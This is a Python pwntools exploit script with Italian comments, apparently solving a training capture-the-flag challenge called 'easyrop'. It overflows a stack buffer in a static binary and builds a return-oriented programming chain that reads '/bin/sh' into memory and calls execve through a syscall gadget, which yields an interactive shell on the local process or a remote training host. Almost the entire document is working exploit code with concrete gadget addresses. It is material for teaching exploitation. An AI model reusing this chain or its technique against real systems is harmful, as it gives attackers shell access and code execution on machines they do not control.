'''
Il programma legge prima 4 byte poi legge altri 4 byte e poi fa la loro somma e li salva su un array.
L'index dell'array è infinito quindi possiamo fare buffer overflow.
Nel file non c'è libc (se noi facciamo da terminale ldd easyrop ci dice 'not a dynamic executable').
Con vmmap (gdb file e poi start e vmmap) vedo che non c'è parte di memoria che è writable e executable.
Quindi l'idea è: abbiamo buffer overflow nel main, non abbiamo roba però che sia writable e executable, quindi non possiamo caricare lo shellcode
ma poichè possiamo scrivere nello stack quanti byte vogliamo allora possiamo creare una ropchain in memoria per fare prima una read di /bin/sh da qualche
parte e poi creiamo una execve usando la syscall instruction che è dentro al binario ma dobbiamo caricare valori nei registri, pointer ecc.

'''
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

# b *0x040021f è il breakpoint after the read
if "REMOTE" not in args:
    r = process("./easyrop")
    gdb.attach(r, """
        # b *0x040021f
        c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2015)


def halfonstack(value):
    r.send(p32(value))
    r.send(p32(0)) # manda 4 bytes con /x00

def onstack(value):
    onehalf = value & 0xffffffff #sono i primi 32 bit
    otherhalf = value >> 32 # questo è value shiftato di 32 bit a destra    

    halfonstack(onehalf)
    halfonstack(otherhalf)

pop_rdi_rsi_rdx_rax = 0x04001c2
read = 0x400144 # è la read (l'ho presa da Ghidra guardando l'indirizzo della prima istruzione della read)
binsh = 0x600500 # è l'indirizzo del buffer dove voglio scrivere /bin/sh
syscall = 0x0400168 # è l'indirizzo della syscall della read

chain = [0x0]*7 # crea un array con 7 zeri: [0, 0, 0, 0, 0, 0, 0]
# ROPgadget --binary ./easyrop > gadget
# Cerco un gadget che abbia RDI, RSI; RDX (a slide 30 del file vecchio)
# Quindi prendo il gadget 0x00000000004001c2 : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
# 0 è il valore che voglio mettere in rdi, binsh è il valore che voglio mettere in rsi, 8 è il valore che voglio mettere in rdx (sono 8 perchè sarebbe /bin/sh0), 0 
# è il valore che voglio mettere in rax (sono i parametri della read)
# poi chiamiamo la read
chain += [
    pop_rdi_rsi_rdx_rax,
    0,
    binsh,
    8,
    0,
    read,
    pop_rdi_rsi_rdx_rax,
    binsh,
    0,
    0,
    0x3b,
    syscall
]

# Questo insieme alle due funzioni serve a scrivere in memoria la ropchain correttamente (all'inizio la provo con dei numeri (for i in range(20)) e 
# vedo che nello stack vedo i numeri correttamente dopo aver sistemato le funzioni)
for i in chain:
    onstack(i)

# Queste due send servono ad uscire dal loop
r.send("\n") 
time.sleep(0.1)
r.send("\n")
time.sleep(0.1)

r.send("/bin/sh\x00")

r.interactive()
